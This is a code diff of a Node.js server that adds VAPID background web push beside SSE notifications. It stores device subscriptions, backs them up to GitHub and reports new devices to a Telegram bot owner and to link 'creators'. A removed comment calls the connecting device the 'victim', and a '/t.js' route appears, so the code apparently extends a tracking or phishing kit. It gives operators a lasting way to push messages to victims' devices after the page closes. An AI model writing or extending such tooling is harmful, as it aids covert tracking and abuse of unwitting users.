@@ -1492,12 +1492,15 @@ app.get("/t.js", (req, res) => {
 })();`);
 });
 
-// ── Push Notifications: SSE-based (no FCM/VAPID needed) ───────────────────────
+// ── Push Notifications: SSE (foreground) + VAPID (background) ─────────────────
 const PUSH_FILE  = "./push_subs.json";
-let pushSubs = loadJSON(PUSH_FILE, {});      // { pid: uid }
-const sseClients = {};                        // { pid: res }  — live connections
+let pushSubs = loadJSON(PUSH_FILE, {});   // { pid: { uid, subscription? } }
+const sseClients = {};                    // { pid: res } — live SSE connections
 
-// SSE stream: victim connects here, stays connected, receives push events
+// Serve VAPID public key
+app.get("/vapid-key", (req, res) => res.json({ key: VAPID_PUBLIC }));
+
+// SSE stream — foreground push
 app.get("/push-stream", (req, res) => {
   const uid = req.query.uid || '';
   const pid = req.query.pid || uid;
@@ -1514,9 +1517,8 @@ app.get("/push-stream", (req, res) => {
 
   sseClients[pid] = res;
 
-  // Register pid in pushSubs if new
   if (!pushSubs[pid]) {
-    pushSubs[pid] = uid;
+    pushSubs[pid] = { uid };
     saveJSON(PUSH_FILE, pushSubs);
     backupFileToGH("./push_subs.json", "_data/push_subs.json");
     const tid = parseInt(uid, 36);
@@ -1524,16 +1526,29 @@ app.get("/push-stream", (req, res) => {
     if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${pid}\n(Creator: ${tid})`);
   }
 
-  // Heartbeat every 25s to keep connection alive
   const hb = setInterval(() => { try { res.write(": hb\n\n"); } catch(e) {} }, 25000);
-
   req.on("close", () => {
     clearInterval(hb);
     if (sseClients[pid] === res) delete sseClients[pid];
   });
 });
 
-function sendPushToDevice(pid, title, body) {
+// VAPID subscription — background push
+app.post("/push-subscribe", (req, res) => {
+  res.send("ok");
+  const uid = req.body.uid || '';
+  const pid = req.body.pid || uid;
+  const sub = req.body.sub;
+  if (!pid || !sub || !sub.endpoint) return;
+  const entry = pushSubs[pid] || { uid };
+  entry.subscription = sub;
+  pushSubs[pid] = entry;
+  saveJSON(PUSH_FILE, pushSubs);
+  backupFileToGH("./push_subs.json", "_data/push_subs.json");
+});
+
+async function sendPushToDevice(pid, title, body) {
+  // 1. Try SSE first (instant, if page is open)
   const client = sseClients[pid];
   if (client) {
     try {
@@ -1541,11 +1556,23 @@ function sendPushToDevice(pid, title, body) {
       return;
     } catch(e) { delete sseClients[pid]; }
   }
-  // Fallback: re-notify via Telegram that device is offline
+  // 2. Fallback to VAPID (background, page closed)
   const entry = pushSubs[pid];
+  if (entry && entry.subscription) {
+    try {
+      await webPush.sendNotification(entry.subscription, JSON.stringify({ title, body }));
+      return;
+    } catch(e) {
+      if (e.statusCode === 410 || e.statusCode === 404) {
+        delete entry.subscription;
+        saveJSON(PUSH_FILE, pushSubs);
+      }
+    }
+  }
+  // 3. Both failed — notify creator
   if (entry) {
-    const tid = parseInt(entry, 36) || parseInt(entry.uid || '', 36);
-    if (tid) notify(tid, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
+    const tid = parseInt(entry.uid, 36);
+    if (tid) notify(tid, `📴 الجهاز غير متصل — سيصل الإشعار عند فتح الرابط مجدداً`);
   }
 }
 
